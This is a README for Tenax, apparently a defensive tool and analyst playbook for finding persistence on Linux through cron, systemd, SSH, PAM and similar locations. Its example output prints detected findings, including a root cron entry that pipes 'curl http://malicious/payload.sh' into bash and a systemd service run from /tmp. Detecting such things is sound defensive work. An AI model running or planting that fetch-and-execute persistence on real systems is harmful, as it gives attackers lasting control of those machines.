# Tenax

> Linux Persistence Analysis — Tool + Playbook

---

## Quick Start

```bash
git clone https://github.com/<your-username>/tenax.git
cd tenax
python main.py analyze
```

Recommended:

```bash
sudo python main.py analyze
```

---

## What It Does

Tenax helps you identify persistence on Linux systems.

- surfaces high-probability persistence
- scores findings by severity
- shows why something is suspicious
- gives you a starting point for investigation

---

## Example Output

```text
## SYSTEMD ##
Path: /etc/systemd/system/update.service
Severity: HIGH
Reason: ExecStart from /tmp
Preview: ExecStart=/tmp/.svc

## CRON ##
Path: /var/spool/cron/root
Severity: HIGH
Reason: curl | bash
Preview: * * * * * curl http://malicious/payload.sh | bash
```

---

## Why Tenax

Linux persistence is not centralized.

There is no single place to check.  
There is no complete checklist.  
There is always another location.

Tenax exists to:

- reduce blind spots  
- prioritize what matters  
- give structure to investigations  

> **You can’t automate everything — but you can stop guessing.**

---

## Modes

### Analyze

```bash
python main.py analyze
```

Finds and scores likely persistence.

---

### Collect

```bash
python main.py collect
```

Pulls artifacts for deeper analysis.

---

## The Playbook (Important)

Tenax is only half the solution.

The rest is the **analyst playbook**:

👉 [docs/README.md](docs/README.md)

This walks you through:

- how to investigate persistence  
- what to prioritize  
- how to validate findings  
- how attackers actually maintain access  

---

## Coverage

Tenax checks:

- cron  
- systemd  
- SSH  
- sudoers  
- shell profiles  
- RC/init  
- LD_PRELOAD  
- autostart  
- at jobs  
- network hooks  
- containers  
- environment hooks  
- PAM  
- capabilities  

---

## Final Thought

If you find one persistence mechanism, assume there are more.
